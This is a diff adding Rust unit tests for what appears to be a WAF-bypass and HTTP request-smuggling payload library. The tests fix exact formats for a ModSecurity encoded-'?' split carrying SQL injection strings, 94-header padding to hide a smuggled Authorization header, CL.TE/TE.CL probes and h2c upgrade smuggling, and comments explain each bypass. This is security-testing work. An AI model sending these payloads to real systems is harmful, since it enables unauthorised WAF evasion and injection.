@@ -614,4 +614,342 @@ mod tests {
         let s = String::from_utf8_lossy(&p.raw_bytes);
         assert!(s.contains("Content-Length: 99"));
     }
+
+    // ── Wire-format tests for functions lacking paired CVE-shape checks ────
+
+    /// CVE-2024-1019 (ModSec URI pre-decode split) — exact wire format.
+    ///
+    /// The produced path must have the exact structure:
+    ///   `<base>%3F<injection>?<benign>`
+    ///
+    /// ModSecurity URL-decodes before split-on-`?`, so `%3F` becomes `?` for
+    /// ModSec (making it think the query starts there), while nginx/Apache
+    /// split on the literal `?`, routing the injection as part of the PATH.
+    #[test]
+    fn modsec_uri_pre_decode_split_wire_format() {
+        let path = modsec_uri_pre_decode_split("/search", "' OR 1=1--", "q=x");
+        // Must contain the URL-encoded question mark delimiter.
+        assert!(
+            path.contains("%3F"),
+            "path must contain %3F (the ModSec-decoded ? pivot), got: {path}"
+        );
+        // Must contain the real ? separating backend query.
+        let real_q_pos = path
+            .rfind('?')
+            .expect("path must contain a real ? for backend query boundary");
+        // Injection must be between %3F and the real ?.
+        let encoded_pos = path.find("%3F").expect("%3F must be present");
+        assert!(
+            encoded_pos < real_q_pos,
+            "%3F (pos {encoded_pos}) must come before literal ? (pos {real_q_pos})"
+        );
+        // Injection payload must be present.
+        assert!(
+            path.contains("' OR 1=1--"),
+            "injection payload must appear in path, got: {path}"
+        );
+        // Benign query must be after the real ?.
+        let after_q = &path[real_q_pos + 1..];
+        assert!(
+            after_q.contains("q=x"),
+            "benign query must follow the real ?, got after-?: {after_q}"
+        );
+        // Structure: base%3Finjection?benign
+        assert!(
+            path.starts_with("/search%3F"),
+            "must start with base_path + %3F, got: {path}"
+        );
+    }
+
+    /// `modsec_uri_pre_decode_split` with a SQL payload.
+    #[test]
+    fn modsec_uri_pre_decode_split_sql_payload() {
+        let path = modsec_uri_pre_decode_split("/api/v1/users", "UNION SELECT 1,2,3--", "page=1");
+        assert!(path.contains("%3F"));
+        assert!(path.contains("UNION SELECT 1,2,3--"));
+        assert!(path.contains("?page=1"));
+        assert_eq!(
+            path,
+            "/api/v1/users%3FUNION SELECT 1,2,3--?page=1",
+            "wire format must match exactly"
+        );
+    }
+
+    /// `header_overflow_smuggle` — wire format: N padding headers + payload.
+    ///
+    /// OpenResty / CF FL silently drops headers past the WAF parsing limit
+    /// (≈94 headers). Padding must use the `X-Pad-{i}` name pattern;
+    /// the payload must be the LAST header in the list.
+    #[test]
+    fn header_overflow_smuggle_padding_count_and_payload_position() {
+        let headers = header_overflow_smuggle(5, "X-Evil-Header", "injection-value");
+        // Total headers = 5 padding + 1 payload.
+        assert_eq!(
+            headers.len(),
+            6,
+            "must produce padding_count + 1 headers (5 padding + 1 payload = 6)"
+        );
+        // Padding headers use X-Pad-{i} name.
+        for i in 0..5 {
+            let (name, val) = &headers[i];
+            assert_eq!(
+                name,
+                &format!("X-Pad-{i}"),
+                "padding header {i} must be X-Pad-{i}, got: {name}"
+            );
+            assert_eq!(val, "v", "padding value must be 'v', got: {val}");
+        }
+        // Payload is the final element.
+        let (payload_name, payload_val) = &headers[5];
+        assert_eq!(
+            payload_name, "X-Evil-Header",
+            "payload header name must be last, got: {payload_name}"
+        );
+        assert_eq!(
+            payload_val, "injection-value",
+            "payload header value must be exact, got: {payload_val}"
+        );
+    }
+
+    /// `header_overflow_smuggle` with zero padding: only the payload header.
+    #[test]
+    fn header_overflow_smuggle_zero_padding() {
+        let headers = header_overflow_smuggle(0, "X-Payload", "value");
+        assert_eq!(headers.len(), 1, "zero padding must produce exactly 1 header");
+        assert_eq!(headers[0].0, "X-Payload");
+        assert_eq!(headers[0].1, "value");
+    }
+
+    /// `header_overflow_smuggle` at a realistic WAF threshold (94 padding).
+    #[test]
+    fn header_overflow_smuggle_at_waf_threshold() {
+        // 94 padding + 1 payload = 95 total. The payload is the 95th header,
+        // which falls past OpenResty's ~94-header inspection limit.
+        let headers = header_overflow_smuggle(94, "Authorization", "Bearer smuggled");
+        assert_eq!(headers.len(), 95, "must have 95 headers total (94 padding + 1 payload)");
+        // All padding headers must be X-Pad-0 through X-Pad-93.
+        for i in 0..94 {
+            assert_eq!(headers[i].0, format!("X-Pad-{i}"));
+        }
+        // Payload is the 95th.
+        assert_eq!(headers[94].0, "Authorization");
+        assert_eq!(headers[94].1, "Bearer smuggled");
+    }
+
+    /// `websocket_smuggle_custom` with custom key and protocol — wire format.
+    ///
+    /// The produced payload must include the exact custom key in
+    /// `Sec-WebSocket-Key:` and the protocol in `Sec-WebSocket-Protocol:`.
+    #[test]
+    fn websocket_smuggle_custom_key_in_payload() {
+        let key = "dGhlIHNhbXBsZSBub25jZQ=="; // base64("the sample nonce")
+        let p = websocket_smuggle_custom("example.com", "/ws", Some(key), None).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(
+            s.contains(&format!("Sec-WebSocket-Key: {key}\r\n")),
+            "custom key must appear verbatim in Sec-WebSocket-Key header, got:\n{s}"
+        );
+        // Must not contain Sec-WebSocket-Protocol when protocol is None.
+        assert!(
+            !s.contains("Sec-WebSocket-Protocol:"),
+            "must not include Sec-WebSocket-Protocol when protocol is None, got:\n{s}"
+        );
+        assert_eq!(p.variant, SmugglingVariant::WebSocket);
+    }
+
+    /// `websocket_smuggle_custom` with both key and protocol.
+    #[test]
+    fn websocket_smuggle_custom_with_protocol() {
+        let key = "testkey==";
+        let proto = "chat, superchat";
+        let p =
+            websocket_smuggle_custom("example.com", "/chat", Some(key), Some(proto)).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(
+            s.contains(&format!("Sec-WebSocket-Key: {key}\r\n")),
+            "custom key must appear verbatim"
+        );
+        assert!(
+            s.contains(&format!("Sec-WebSocket-Protocol: {proto}\r\n")),
+            "protocol must appear in Sec-WebSocket-Protocol header, got:\n{s}"
+        );
+        assert!(s.contains("GET /chat HTTP/1.1\r\n"));
+    }
+
+    /// `cl_te_precedence_test` — wire format matches RFC-legal CL+TE body.
+    ///
+    /// This probe sends both CL and TE. The body `5\r\nhello\r\n0\r\n\r\n`
+    /// is valid chunked encoding (5-byte chunk "hello", then terminator).
+    /// CL equals the full body byte count. This is the "both headers
+    /// present, consistent" case used to distinguish frontend/backend
+    /// parsing behaviour without causing a hang.
+    #[test]
+    fn cl_te_precedence_test_wire_format() {
+        let payloads = cl_te_precedence_test("example.com").unwrap();
+        assert!(!payloads.is_empty(), "must return at least one payload");
+        let p = &payloads[0];
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        // Must have both headers.
+        assert!(
+            s.contains("Content-Length:"),
+            "must include Content-Length header"
+        );
+        assert!(
+            s.contains("Transfer-Encoding: chunked"),
+            "must include Transfer-Encoding: chunked"
+        );
+        // CL must match the byte length of the chunked body.
+        let body_content = "5\r\nhello\r\n0\r\n\r\n";
+        let expected_cl = body_content.len();
+        assert!(
+            s.contains(&format!("Content-Length: {expected_cl}\r\n")),
+            "CL ({expected_cl}) must equal body byte count, got:\n{s}"
+        );
+        // Body must be the chunked encoding of "hello".
+        let sep_pos = p
+            .raw_bytes
+            .windows(4)
+            .position(|w| w == b"\r\n\r\n")
+            .expect("header separator");
+        let body = &p.raw_bytes[sep_pos + 4..];
+        assert_eq!(
+            body,
+            body_content.as_bytes(),
+            "body must be the canonical chunked form"
+        );
+    }
+
+    /// `malformed_http2_settings` — all three variants present, each has
+    /// `HTTP2-Settings:` header with the malformed value.
+    ///
+    /// The three settings are `"!!!"`, `""`, and `"AA"`. Each must produce
+    /// a distinct payload with the corresponding settings value.
+    #[test]
+    fn malformed_http2_settings_three_variants_present() {
+        let payloads = malformed_http2_settings("example.com").unwrap();
+        assert_eq!(
+            payloads.len(),
+            3,
+            "must produce exactly 3 malformed variants, got {}",
+            payloads.len()
+        );
+        let expected_settings: &[&str] = &["!!!", "", "AA"];
+        for (i, (payload, expected)) in payloads.iter().zip(expected_settings).enumerate() {
+            let s = String::from_utf8_lossy(&payload.raw_bytes);
+            assert!(
+                s.contains(&format!("HTTP2-Settings: {expected}\r\n")),
+                "variant {i} must contain 'HTTP2-Settings: {expected}', got:\n{s}"
+            );
+            assert!(
+                s.contains("Upgrade: h2c\r\n"),
+                "variant {i} must have Upgrade: h2c, got:\n{s}"
+            );
+            assert_eq!(
+                payload.variant,
+                SmugglingVariant::H2c,
+                "variant {i} must be H2c smuggling variant"
+            );
+        }
+    }
+
+    /// `malformed_http2_settings` — host validation is applied.
+    #[test]
+    fn malformed_http2_settings_rejects_crlf_host() {
+        assert!(malformed_http2_settings("host\r\nevil").is_err());
+        assert!(malformed_http2_settings("host\nevil").is_err());
+    }
+
+    /// `detect_te_cl` — exact wire body shape.
+    ///
+    /// Body must be: `5\r\n\r\n0\r\n\r\n`
+    /// - `5\r\n` = chunk-size line (3 bytes; CL covers ONLY these 3)
+    /// - `\r\n`  = chunk-data (the 5-byte chunk uses \r\n as content — note:
+    ///             actual chunk would be 5 bytes but this probe is timing-based)
+    /// - `0\r\n\r\n` = terminating chunk
+    ///
+    /// CL=3 makes the CL-following front-end read exactly the 3-byte
+    /// chunk-size line, while the TE-following back-end reads the full
+    /// chunked sequence and hangs.
+    #[test]
+    fn detect_te_cl_exact_body_shape() {
+        let p = detect_te_cl("example.com").unwrap();
+        let sep = b"\r\n\r\n";
+        let pos = p
+            .raw_bytes
+            .windows(sep.len())
+            .position(|w| w == sep)
+            .expect("header separator must be present");
+        let body = &p.raw_bytes[pos + sep.len()..];
+        assert_eq!(
+            body,
+            b"5\r\n\r\n0\r\n\r\n",
+            "detect_te_cl body must be exactly '5\\r\\n\\r\\n0\\r\\n\\r\\n', \
+             got: {body:?}"
+        );
+        // CL=3 covers the first 3 bytes of the body ("5\r\n").
+        assert_eq!(
+            &body[..3],
+            b"5\r\n",
+            "first 3 bytes (what CL-frontend reads) must be '5\\r\\n'"
+        );
+    }
+
+    /// `h2c_smuggle` with a custom settings string — wire format.
+    ///
+    /// The custom settings string must appear verbatim in `HTTP2-Settings:`.
+    #[test]
+    fn h2c_smuggle_custom_settings_in_payload() {
+        let custom_settings = "CUSTOM_SETTINGS_B64==";
+        let p = h2c_smuggle("example.com", Some(custom_settings)).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(
+            s.contains(&format!("HTTP2-Settings: {custom_settings}\r\n")),
+            "custom HTTP2-Settings must appear verbatim, got:\n{s}"
+        );
+        assert!(s.contains("Upgrade: h2c\r\n"));
+        assert!(s.contains("Connection: Upgrade, HTTP2-Settings\r\n"));
+        assert_eq!(p.variant, SmugglingVariant::H2c);
+    }
+
+    /// `h2c_smuggle` default settings uses the canonical base64 settings.
+    #[test]
+    fn h2c_smuggle_default_settings_is_canonical() {
+        let p = h2c_smuggle("example.com", None).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(
+            s.contains(&format!("HTTP2-Settings: {DEFAULT_HTTP2_SETTINGS}\r\n")),
+            "default settings must be DEFAULT_HTTP2_SETTINGS, got:\n{s}"
+        );
+    }
+
+    /// `h2c_post_smuggle` — Content-Length matches body length exactly.
+    #[test]
+    fn h2c_post_smuggle_content_length_matches_body() {
+        let body = b"field=value&other=data";
+        let p = h2c_post_smuggle("example.com", body, None).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(
+            s.contains(&format!("Content-Length: {}\r\n", body.len())),
+            "Content-Length must match body byte count exactly ({}), got:\n{s}",
+            body.len()
+        );
+        // Body must be appended after the header block.
+        assert!(
+            p.raw_bytes.ends_with(body),
+            "body bytes must be the last {} bytes of raw_bytes", body.len()
+        );
+        // Must use POST method.
+        assert!(s.starts_with("POST / HTTP/1.1\r\n"));
+    }
+
+    /// `h2c_post_smuggle` with empty body — Content-Length must be 0.
+    #[test]
+    fn h2c_post_smuggle_empty_body() {
+        let p = h2c_post_smuggle("example.com", b"", None).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(
+            s.contains("Content-Length: 0\r\n"),
+            "empty body must produce Content-Length: 0, got:\n{s}"
+        );
+    }
 }
